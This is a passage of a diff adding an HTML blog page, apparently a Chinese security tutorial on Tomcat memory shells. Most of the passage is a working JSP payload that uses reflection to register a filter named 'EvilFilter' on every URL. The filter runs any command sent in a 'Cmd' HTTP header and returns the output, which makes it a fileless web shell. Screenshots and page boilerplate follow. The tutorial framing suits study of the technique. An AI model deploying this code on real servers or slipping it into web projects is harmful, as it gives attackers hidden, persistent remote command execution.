+</span></span><span class="line"><span class="cl">  <span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span> <span class="n">appctxField</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">servletContext</span><span class="p">);</span><span class="o">//</span><span class="n">通过反射获取</span> <span class="n">servletContext</span> <span class="n">中的</span> <span class="n">context</span> <span class="n">字段的值</span><span class="err">，</span><span class="n">并将其转换为</span> <span class="n">ApplicationContext</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Field</span> <span class="n">stdctxField</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;context&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">stdctxField</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span> <span class="n">stdctxField</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">applicationContext</span><span class="p">);</span><span class="o">//</span><span class="n">通过反射获取</span> <span class="n">applicationContext</span> <span class="n">对象中的</span> <span class="n">context</span> <span class="n">字段的值</span><span class="err">，</span><span class="n">并将其转换为</span> <span class="n">StandardContext</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="o">//</span> <span class="n">获取</span> <span class="n">FilterConfigs</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Field</span> <span class="n">filterConfigsField</span> <span class="o">=</span> <span class="n">standardContext</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;filterConfigs&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">filterConfigsField</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Map</span> <span class="n">filterConfigs</span> <span class="o">=</span> <span class="p">(</span><span class="n">Map</span><span class="p">)</span> <span class="n">filterConfigsField</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">standardContext</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="o">//</span> <span class="n">编写</span> <span class="n">Filter</span>
+</span></span><span class="line"><span class="cl">  <span class="n">String</span> <span class="n">filterName</span> <span class="o">=</span> <span class="s2">&#34;EvilFilter&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">filterConfigs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">filterName</span><span class="p">)</span><span class="o">==</span><span class="n">null</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Filter</span> <span class="nb">filter</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Filter</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">      <span class="n">public</span> <span class="n">void</span> <span class="n">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="p">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="p">,</span> <span class="n">FilterChain</span> <span class="n">filterChain</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span><span class="p">,</span> <span class="n">ServletException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">HttpServletRequest</span> <span class="n">httpServletRequest</span> <span class="o">=</span> <span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span> <span class="n">servletRequest</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PrintWriter</span> <span class="n">pw</span> <span class="o">=</span> <span class="n">servletResponse</span><span class="o">.</span><span class="n">getWriter</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">httpServletRequest</span><span class="o">.</span><span class="n">getHeader</span><span class="p">(</span><span class="s2">&#34;Cmd&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">Process</span> <span class="n">process</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">InputStream</span> <span class="nb">input</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">          <span class="n">BufferedReader</span> <span class="n">br</span> <span class="o">=</span> <span class="n">new</span> <span class="n">BufferedReader</span><span class="p">(</span><span class="n">new</span> <span class="n">InputStreamReader</span><span class="p">(</span><span class="nb">input</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">          <span class="n">String</span> <span class="n">line</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="k">while</span> <span class="p">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="n">readLine</span><span class="p">())</span> <span class="o">!=</span> <span class="n">null</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pw</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="n">br</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">          <span class="nb">input</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">          <span class="n">pw</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">创建</span> <span class="n">FilterDef</span><span class="p">,</span><span class="n">为了创建</span> <span class="n">FilterConfig</span><span class="p">,</span><span class="n">即</span> <span class="n">ApplicationFilterConfig</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FilterDef</span> <span class="n">filterDef</span> <span class="o">=</span> <span class="n">new</span> <span class="n">FilterDef</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filterDef</span><span class="o">.</span><span class="n">setFilterName</span><span class="p">(</span><span class="n">filterName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filterDef</span><span class="o">.</span><span class="n">setFilterClass</span><span class="p">(</span><span class="nb">filter</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getName</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filterDef</span><span class="o">.</span><span class="n">setFilter</span><span class="p">(</span><span class="nb">filter</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">添加</span> <span class="n">FilterDef</span>
+</span></span><span class="line"><span class="cl">    <span class="n">standardContext</span><span class="o">.</span><span class="n">addFilterDef</span><span class="p">(</span><span class="n">filterDef</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">创建</span> <span class="n">FilterMap</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">=</span> <span class="n">new</span> <span class="n">FilterMap</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filterMap</span><span class="o">.</span><span class="n">setFilterName</span><span class="p">(</span><span class="n">filterName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filterMap</span><span class="o">.</span><span class="n">addURLPattern</span><span class="p">(</span><span class="s2">&#34;/*&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filterMap</span><span class="o">.</span><span class="n">setDispatcher</span><span class="p">(</span><span class="n">DispatcherType</span><span class="o">.</span><span class="n">REQUEST</span><span class="o">.</span><span class="n">name</span><span class="p">());</span> <span class="o">//</span>  <span class="n">setDispatcher是FilterMap的一个设置过滤器的调度类型方法</span><span class="err">，</span><span class="n">这里设置了过滤器在</span> <span class="n">REQUEST</span> <span class="n">调度类型下触发</span><span class="err">，</span><span class="n">即当收到普通的</span> <span class="n">HTTP</span> <span class="n">请求时</span><span class="err">，</span><span class="n">过滤器会被执行</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">添加</span> <span class="n">FilterMap</span> <span class="n">到首位</span>
+</span></span><span class="line"><span class="cl">    <span class="n">standardContext</span><span class="o">.</span><span class="n">addFilterMapBefore</span><span class="p">(</span><span class="n">filterMap</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">因为</span> <span class="n">ApplicationFilterConfig</span> <span class="n">的构造方法是不带</span> <span class="n">public</span> <span class="n">的</span><span class="p">,</span> <span class="n">即默认的作用域为</span> <span class="n">package</span><span class="p">,</span> <span class="n">所以我们需要通过反射来实例化该对象</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">ApplicationFilterConfig</span><span class="o">.</span><span class="n">class</span><span class="o">.</span><span class="n">getDeclaredConstructor</span><span class="p">(</span><span class="n">Context</span><span class="o">.</span><span class="n">class</span><span class="p">,</span> <span class="n">FilterDef</span><span class="o">.</span><span class="n">class</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">constructor</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ApplicationFilterConfig</span> <span class="n">applicationFilterConfig</span> <span class="o">=</span> <span class="p">(</span><span class="n">ApplicationFilterConfig</span><span class="p">)</span> <span class="n">constructor</span><span class="o">.</span><span class="n">newInstance</span><span class="p">(</span><span class="n">standardContext</span><span class="p">,</span> <span class="n">filterDef</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">添加</span> <span class="n">FilterConfig</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filterConfigs</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">filterName</span><span class="p">,</span> <span class="n">applicationFilterConfig</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">out</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="s2">&#34;inject success&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
+</span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2025.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2026.png" alt="image.png"></p>
+
+    </article>
+
+    
+    <div class="comments">
+  <div class="giscus"></div>
+</div>
+<script 
+  src="https://giscus.app/client.js" 
+  data-repo="dlzmoe/blog" 
+  data-repo-id="R_kgDOJkJvtw"
+  data-category="Announcements" 
+  data-category-id="DIC_kwDOJkJvt84CX9d6" 
+  data-mapping="url" 
+  data-strict="0"
+  data-reactions-enabled="1" 
+  data-emit-metadata="1" 
+  data-input-position="top" 
+  data-theme="light_protanopia"
+  data-lang="zh-CN" 
+  data-loading="lazy" 
+  crossorigin="anonymous" 
+  async>
+</script>
+
+    
+    
+  </section>
+  <footer class="footer">
+  <p>© 2024 - 2024 Powered by
+    <a href="https://github.com/w0s1np" target="_blank">Github</a>
+    / <a href="/index.xml" target="_blank">RSS</a>
+  </p>
+</footer>
+
+
+</body>
+
+</html>
